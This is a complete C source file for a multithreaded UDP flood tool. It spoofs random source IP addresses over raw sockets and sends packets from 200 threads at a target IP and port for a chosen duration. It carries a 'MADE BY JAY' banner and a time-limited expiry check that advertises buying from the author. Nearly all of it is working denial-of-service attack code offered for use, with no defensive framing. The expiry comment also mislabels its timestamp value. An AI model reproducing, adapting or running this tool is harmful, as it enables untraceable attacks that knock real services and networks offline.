#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define THREAD_COUNT 200
#define PACKET_SIZE 1024

// Expiry timestamp: UNIX epoch seconds for 2030-09-30 00:00:00 UTC
#define EXPIRY_TIMESTAMP 1893427200UL

const char text_payload[] =
"MMMM    M   AAAAAA  DDDDDD  EEEEE   BBBBBB   Y   Y    JJJJJ  AAAAAA  Y   Y\n"
"M  M    M   A    A  D     D E       B     B   Y Y        J   A    A  Y Y \n"
"M   M  M   AAAAAAA  D     D EEEE    BBBBBB     Y         J   AAAAAAA  Y  \n"
"M    MMM   A     A  D     D E       B     B    Y         J   A     A  Y  \n"
"M     M   A       A DDDDDD  EEEEE   BBBBBB     Y       JJJJ  A       A Y\n";

// Compute checksum for IP header
unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum = 0;
    for (int i = 0; i < nwords; i++) sum += buf[i];
    while (sum >> 16) sum = (sum & 0xFFFF) + (sum >> 16);
    return (unsigned short)(~sum);
}

// UDP checksum calculation (pseudo header + udp header + data)
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

unsigned short udp_checksum(struct iphdr *iph, struct udphdr *udph, unsigned char *data, int data_len) {
    char buf[PACKET_SIZE + sizeof(struct pseudo_header)];
    struct pseudo_header psh;

    psh.source_address = iph->saddr;
    psh.dest_address = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + data_len);

    memcpy(buf, &psh, sizeof(struct pseudo_header));
    memcpy(buf + sizeof(struct pseudo_header), udph, sizeof(struct udphdr));
    memcpy(buf + sizeof(struct pseudo_header) + sizeof(struct udphdr), data, data_len);

    int length = sizeof(struct pseudo_header) + sizeof(struct udphdr) + data_len;
    return csum((unsigned short*)buf, length / 2 + length % 2);
}

// Generate random IP address for spoofing
unsigned int random_ip() {
    unsigned char a = (rand() % 223) + 1; // Avoid 0 and multicast
    unsigned char b = rand() % 256;
    unsigned char c = rand() % 256;
    unsigned char d = (rand() % 254) + 1; // Avoid 0 and 255
    return (a << 24) | (b << 16) | (c << 8) | d;
}

typedef struct {
    char target_ip[32];
    int target_port;
    int duration;
} attack_params_t;

void *send_spoofed_packets(void *arg) {
    attack_params_t *params = (attack_params_t *)arg;

    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (sockfd < 0) {
        perror("Raw socket creation failed");
        pthread_exit(NULL);
    }

    int on = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {
        perror("Error setting IP_HDRINCL");
        close(sockfd);
        pthread_exit(NULL);
    }

    char packet[PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(packet + sizeof(struct iphdr));
    unsigned char *data = (unsigned char *)(packet + sizeof(struct iphdr) + sizeof(struct udphdr));

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(params->target_port);
    if (inet_pton(AF_INET, params->target_ip, &sin.sin_addr) <= 0) {
        perror("Invalid target IP");
        close(sockfd);
        pthread_exit(NULL);
    }

    time_t start_time = time(NULL);

    while (difftime(time(NULL), start_time) < params->duration) {
        // Fill data buffer: random + repeated big text payload
        for (int i = 0; i < PACKET_SIZE; i++) {
            data[i] = rand() % 256;
        }

        int text_len = (int)strlen(text_payload);
        for (int i = 0; i < PACKET_SIZE; i += text_len) {
            int copy_len = (i + text_len <= PACKET_SIZE) ? text_len : PACKET_SIZE - i;
            memcpy(data + i, text_payload, copy_len);
        }

        // IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + PACKET_SIZE);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = htonl(random_ip()); // spoofed src IP
        iph->daddr = sin.sin_addr.s_addr;

        iph->check = csum((unsigned short *)iph, iph->ihl * 2);

        // UDP header
        udph->source = htons(rand() % 65535);
        udph->dest = htons(params->target_port);
        udph->len = htons(sizeof(struct udphdr) + PACKET_SIZE);
        udph->check = 0;

        // UDP checksum
        udph->check = udp_checksum(iph, udph, data, PACKET_SIZE);

        // Send packet
        if (sendto(sockfd, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + PACKET_SIZE, 0,
                   (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("sendto failed");
        }
    }

    close(sockfd);
    pthread_exit(NULL);
}

int expiry_check() {
    time_t now = time(NULL);
    if (now > EXPIRY_TIMESTAMP) {
        printf("\n\n");
        printf("**************************************************\n");
        printf("************  FILE EXPIRED  **********************\n");
        printf("******     BUY BIG BIG FROM JAY - PROTECT YOURSELF!    ******\n");
        printf("**************************************************\n\n");
        return 0;
    }
    return 1;
}

int main(int argc, char *argv[]) {
    if (!expiry_check()) return 1;

    if (argc != 4) {
        fprintf(stderr, "Usage: %s <ip> <port> <time>\n", argv[0]);
        fprintf(stderr, "Requires root/admin privileges to run.\n");
        exit(EXIT_FAILURE);
    }

    attack_params_t params;
    strncpy(params.target_ip, argv[1], sizeof(params.target_ip) - 1);
    params.target_ip[sizeof(params.target_ip) - 1] = '\0';
    params.target_port = atoi(argv[2]);
    params.duration = atoi(argv[3]);

    if (params.target_port <= 0 || params.target_port > 65535) {
        fprintf(stderr, "Invalid port number.\n");
        exit(EXIT_FAILURE);
    }
    if (params.duration <= 0) {
        fprintf(stderr, "Duration should be a positive integer.\n");
        exit(EXIT_FAILURE);
    }

    pthread_t threads[THREAD_COUNT];
    srand(time(NULL));

    for (int i = 0; i < THREAD_COUNT; i++) {
        if (pthread_create(&threads[i], NULL, send_spoofed_packets, &params) != 0) {
            fprintf(stderr, "Error creating thread %d\n", i);
        }
    }

    for (int i = 0; i < THREAD_COUNT; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("Attack completed.\n");
    return 0;
}
